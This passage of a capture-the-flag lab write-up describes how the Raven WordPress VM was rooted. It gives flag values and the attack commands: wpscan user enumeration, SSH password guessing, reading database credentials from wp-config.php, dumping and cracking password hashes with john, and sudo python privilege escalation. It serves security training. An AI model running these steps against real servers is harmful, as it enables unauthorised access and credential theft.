# Nmap done at Tue Nov  9 23:09:45 2021 -- 1 IP address (1 host up) scanned in 44.94 seconds
```

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: b9bbcb33e11b80be759c4e844862482d
    - **Exploit Used**
      - Method 1
        - Ran `wpscan` to enumerate users
          - `wpscan --url http://192.168.1.110/wordpress --enumerate u`
        - Then SSH into *target1* by guessing password of *michael*
          - `ssh michael@192.168.1.110` <br>
          ![SSH with michael](Images\ssh_michael.png)
        - Run `grep` command to search for the string 'flag' in `/var/www`
          - `grep -iR flag1` <br>
          ![Flag1 - Grep](Images\flag1_grep.png)
      
      - Method 2
        - Checked page sources of pages
        - Flag located in `http://192.168.1.110/service.html` <br>
        ![Flag1 - View Source](Images\flag1_source.png)


  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
    - **Exploit Used**
      - SSH into *target1* by guessing password of *michael*
          ![SSH with michael](Images\ssh_michael.png)
      - Searching directory for *flag2*
        - `find . -iname flag2`
      - Located `/var/www/flag2.txt`
        - `cat /var/www/flag2.txt`


  - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
    - **Exploit Used**
      - Obtained password stored in plain text
        - `/var/www/html/wordpress/wp-config.php`
        <br> ![wp-config](Images\wp-config.png)
      - Access MySQL databases
        ```bash
        michael@target1:/var/www/html$ mysql -u root -pR@v3nSecurity
        ```
        ![MySQL Access](Images\mysql_access.png)
      - Obtained hashes from `wordpress` database `wp_users`
        ```sql
        use wordpress;
        select * from wp_users;
        ```
        ![MySQL Users](Images\mysql_users.png)
      - Created text file with content
        ```bash
        root@Kali:~# nano wordpresspw
        ```
        ```
        michael:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0
        steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/
        ```
      - Cracked password using `john`
        ```bash
        root@Kali:~# john --wordlist=rockyou.txt wordpresspw
        ```
        ![cracking stevens password with john](Images\john_steven.png)
      - Logged into Wordpress admin
      - Checked `Posts > All Posts > Located *flag3 - Draft*` <br>
      ![flag3](Images\flag3.png)

  - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce

    ```
    ______                      
    | ___ \                     
    | |_/ /__ ___   _____ _ __  
    |    // _` \ \ / / _ \ '_ \ 
    | |\ \ (_| |\ V /  __/ | | |
    \_| \_\__,_| \_/ \___|_| |_|

                                
    flag4{715dea6c055b9fe3337544932f2941ce}

    CONGRATULATIONS on successfully rooting Raven!

    This is my first Boot2Root VM - I hope you enjoyed it.

    Hit me up on Twitter and let me know what you thought: 

    @mccannwj / wjmccann.github.io
    ```
    - **Exploit Used**
      - SSH into `target1` using username and password cracked from john <br>
      ![SSH with steven's account](Images\ssh_steven.png)
      - List sudo privileges of the account *steven* <br>
      ![sudo -l](Images\sudo.png)
      - Exploit *steven*'s ability to run python as *sudo* <br>
      ![Privilege Escalation with Python](Images\python_privesc.png)
      - Using `cat` to view flag4.txt <br>
      ![cat flag4.txt](Images\flag4.png)